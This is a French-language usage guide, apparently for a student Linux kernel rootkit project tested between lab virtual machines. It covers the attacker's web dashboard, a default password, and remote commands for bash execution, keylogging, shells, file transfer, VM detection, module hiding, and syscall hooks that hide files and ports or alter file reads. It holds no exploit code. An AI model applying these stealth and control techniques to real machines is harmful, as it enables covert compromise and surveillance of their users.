# Utilisation
\tableofcontents

L’utilisation du rootkit peut se faire soit en ligne de commande, soit via l’interface graphique intégrée. Nous allons ici décrire les deux méthodes.

> Pour tirer pleinement parti de cette section, veuillez d’abord vous assurer que la mise en place a été correctement effectuée, comme décrit précédemment dans la section [Mise en place](02_install.md).

Dans un premier temps, nous expliquerons comment interagir avec l’interface web. Ensuite, nous détaillerons l’ensemble des commandes de base permettant d’interagir à distance avec le rootkit, accessibles aussi bien en ligne de commande (CLI) côté attaquant qu’à travers des boutons ou des champs de saisie dans l’interface graphique.

## 🌐 Interface Web

### 1. Connexion

Normalement, à ce stade, vous devriez avoir les deux machines virtuelles ouvertes, avec le serveur Python en cours d’exécution, ainsi que l’interface web si vous avez choisi cette option. Vous devriez alors voir un écran similaire à celui présenté ci-dessous. Le rootkit est détecté et connecté, mais une authentification est nécessaire pour accéder à l’ensemble des fonctionnalités et contrôler la machine victime à distance. Cliquez ensuite sur Authenticate et saisissez le mot de passe `evannounnet`. Après quelques instants, le tableau de bord principal de l’application devrait s’afficher.
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/connect.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit connected.
  </figcaption>
</figure>
\endhtmlonly
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/authent.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui while authenticating.
  </figcaption>
</figure>
\endhtmlonly
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/dash.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's dashboard after authentication.
  </figcaption>
</figure>
\endhtmlonly

### 2. Dashboard

FIXME

### 3. Terminal

FIXME

### 4. Keylogger

FIXME

## 🚀 Commandes

Voici l'ensemble des commandes que nous pouvons utiliser via le terminal, soit dans l'interface web, soit en ligne de commande. La partie **hooks** implémente également un sous-menu de commandes.

### 1. 🆘 help
```bash
help
```
Cette commande permet simplement d’afficher un menu récapitulatif de toutes les commandes disponibles pour l’attaquant. Certaines commandes affichées ont plus de sens et sont surtout utilisées dans le cadre de l’interface Web.

### 2. 🔌 connect
```bash
connect [PASSWORD]
```
Cette commande permet d’authentifier l’attaquant pour pouvoir accéder au rootkit à distance. Le mot de passe peut ensuite être changé avec la commande `passwd`.

### 3. 🔌 disconnect
```bash
disconnect
```
Cette commande est le complément de `connect` : elle permet de se déconnecter du rootkit distant. Il faudra donc se reconnecter pour pouvoir entrer de nouvelles commandes.

### 4. 📡 ping
```bash
ping
```
Cette commande permet de tester la connectivité du rootkit. Si la connexion est établie, la console devrait renvoyer `pong`.

### 5. 🔐 passwd
```bash
passwd [PASSWORD]
```
Cette commande permet de changer le mot de passe actuellement utilisé pour se connecter au rootkit. Une fois le mot de passe modifié, il sera haché et stocké en interne sur la machine victime.

**Exemple**
```bash
passwd root
```

### 6. 🖥️ exec
```bash
exec [OPTIONS] [COMMAND]
```
Cette commande permet d'exécuter du code Bash dans l’espace utilisateur (userland) de la machine victime. Par défaut, elle renvoie le contenu de *stdout*, *stderr* ainsi que le code de sortie. Pour éviter cette sortie, il est possible d’ajouter l’option `-s`. Une fois exécutée, la commande se comporte comme si le code Bash était directement saisi dans le terminal de la victime.

**Exemples**
```bash
exec ls
exec man man
exec -s whoami
exec ping 8.8.8.8 
```

### 7. 👁️ klgon
```bash
klgon
```

### 8. 👁️ klgoff
```bash
klgoff
```

### 9. 📝 klg
```bash
klg
```

### 10. 🐚 getshell
```bash
getshell
```

### 11. 💀 killcom
```bash
killcom
```
Cette commande est relativement intrusive : elle coupe la communication avec le rootkit et supprime le module via `rmmod`. Elle est principalement utilisée à des fins de test et de développement, car en conditions réelles, on ne souhaiterait pas nécessairement détruire le module. Si l’objectif est uniquement de déconnecter proprement l’attaquant, utilisez plutôt la commande `disconnect`.

### 12. 🙈 hide_module
```bash
hide_module
```
Cette commande permet de masquer le module noyau en le retirant de la liste chaînée des modules maintenue par le noyau Linux, le rendant ainsi indétectable par les outils système classiques.

### 13. 👀 unhide_module
```bash
unhide_module
```
Cette commande est l’inverse de la précédente : elle permet de rétablir un module précédemment masqué en le réinsérant dans la liste des modules du noyau.

### 14. 📥 get_file
```bash
get_file
```

### 15. 📤 upload
```bash
upload
```

### 16. 🧠 sysinfo
```bash
sysinfo
```

### 17. 🖥️ is_in_vm
```bash
is_in_vm
```
Cette commande permet de détecter si le rootkit s'exécute dans un environnement virtualisé, tel qu’un hyperviseur ou un logiciel de virtualisation.

### 18. 🪝 hooks

Cette commande permet en réalité d’accéder à un sous-menu de commandes, spécifiquement dédié à l’interception des appels système (syscalls) sur la machine victime. Ainsi, toutes les commandes suivantes doivent être précédées de `hooks` pour fonctionner correctement. Ces fonctionnalité sont persistantes, donc ne sont pas affectées par un redémarrage du système ou une déconnexion, du moment que le module est inseré. En effet, des fichiers de configuration sont recupérés à chaque insertions et mis à jour régulièrement pour maintenir le comportement des alterations.

#### a. help
```bash
hooks help
```
Cette commande permet simplement d’afficher un menu récapitulatif de toutes les commandes `hooks` disponibles pour l’attaquant.

#### b. hide
```bash
hooks hide [PATH]
```
Cette commande permet de masquer un fichier ou un dossier spécifique en fournissant son chemin absolu. En arrière-plan, le syscall `getdents64` est intercepté afin de filtrer le contenu affiché lors de l’énumération des fichiers.

#### c. unhide
```bash
hooks unhide [PATH]
```
Cette commande annule l’effet de la commande `hooks hide` en rendant à nouveau visible le fichier ou dossier ciblé.

#### e. list_hide
```bash
hooks list_hide
```
Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été masqués à l’aide de la commande `hooks hide`.

#### f. forbid
```bash
hooks forbid [PATH]
```
Cette commande permet d’interdire l’accès à un fichier ou à un dossier, sans pour autant le masquer, même pour un utilisateur disposant des privilèges superutilisateur. Les appels système `openat`, `newfstatat`, `fstat`, `lstat`, `stat` et `chdir` sont interceptés et renvoient l’erreur `-ENOENT` (*No such file or directory*), comme si l’élément n’existait pas.

#### g. unforbid
```bash
hooks unforbid [PATH]
```
Cette commande annule l’effet de la commande précédente. 

#### h. list_forbid
```bash
hooks list_forbid
```
Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été interdits à l’aide de la commande `hooks forbid`.

#### i. modify
```bash
hooks modify [PATH] [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]
```

Cette commande correspond à l’interception de l’appel système read(). Elle permet, pour n’importe quel fichier, de :
- cacher une ligne précise,
- cacher les lignes contenant un mot-clé,
- remplacer certains mots-clés par d'autres.

Bien entendu, il ne s’agit pas d’une fonctionnalité particulièrement utile dans le cadre d’un rootkit, mais elle permet de démontrer concrètement la plupart des manipulations possibles à l’aide de hooks. Cela dit, cette commande reste délicate à utiliser, notamment en présence de fichiers très longs, ce qui peut entraîner des comportements imprévus... Pour l’utiliser et la tester, il faut respecter le modèle présenté ci-dessus, en précisant les paramètres `hide_line`, `hide_substr` ou `replace` uniquement lorsque cela est nécessaire. Comme pour les autres commandes, le chemin du fichier doit être absolu. Le fonctionnement est également assez primitif, car les espaces ne sont pas pris en charge.

**Exemples**
```bash
modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita
modify /home/victim/test.txt hide_substr=claire replace=efrei:epita
modify /home/victim/test.txt replace=efrei:epita hide_substr=claire
modify /home/victim/test.txt hide_substr=claire hide_line=10
modify /home/victim/test.txt hide_line=1
```

#### j. unmodify
```bash
hooks unmodify [PATH]
```
Cette commande annule l’effet de la commande précédente. Elle prend en compte uniquement le chemin absolu pour supprimer l'entrée.

#### k. list_modify
```bash
hooks list_modify
```
Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été modifiés à l’aide de la commande `hooks modify`.

#### l. add_port
```bash
hooks add_port [PORT]
```

#### m. remove_port
```bash
hooks remove_port [PORT]
```
Cette commande annule l’effet de la commande précédente.

#### n. list_port
```bash
hooks list_port
```
Cette commande affiche la liste complète de tous les ports cachés.

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>

<div class="section_buttons">

| Previous                          | Next                               |
|:----------------------------------|-----------------------------------:|
| [Architecture](03_archi.md)       |[Environnement](05_env.md)          |
</div>